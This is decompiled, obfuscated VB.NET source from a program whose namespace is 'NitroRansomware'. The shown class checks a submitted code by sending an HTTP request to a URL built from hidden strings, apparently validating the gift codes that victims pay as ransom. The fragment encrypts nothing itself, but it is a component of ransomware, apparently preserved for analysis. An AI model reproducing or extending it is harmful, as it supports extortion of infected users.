Imports System
Imports System.Net
Imports System.Net.Http
Imports System.Threading.Tasks
Imports dg3ypDAonQcOidMs0w
Imports rE4lpnT863QnijKQK5

Namespace NitroRansomware
	' Token: 0x02000006 RID: 6
	Friend Class Nitro
		' Token: 0x06000020 RID: 32 RVA: 0x000046E4 File Offset: 0x000028E4
		Public Shared Function Check(code As String) As Boolean
			Dim flag As Boolean
			Using httpClient As HttpClient = New HttpClient()
				Dim text As String = WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3966) + code + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4072)
				Nitro.logging.Debug(text)
				Dim async As Task(Of HttpResponseMessage) = httpClient.GetAsync(text)
				If async.Result.StatusCode <> HttpStatusCode.NotFound Then
					flag = True
				Else
					flag = False
				End If
			End Using
			Return flag
		End Function

		' Token: 0x06000021 RID: 33 RVA: 0x00002243 File Offset: 0x00000443
		Public Sub New()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			MyBase..ctor()
		End Sub

		' Token: 0x06000022 RID: 34 RVA: 0x00002318 File Offset: 0x00000518
		' Note: this type is marked as 'beforefieldinit'.
		Shared Sub New()
			WP6RZJql8gZrNhVA9v.iXLoKRSpAw()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			Nitro.logging = New Logs(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(234), 0)
		End Sub

		' Token: 0x04000026 RID: 38
		Private Shared logging As Logs
	End Class
End Namespace
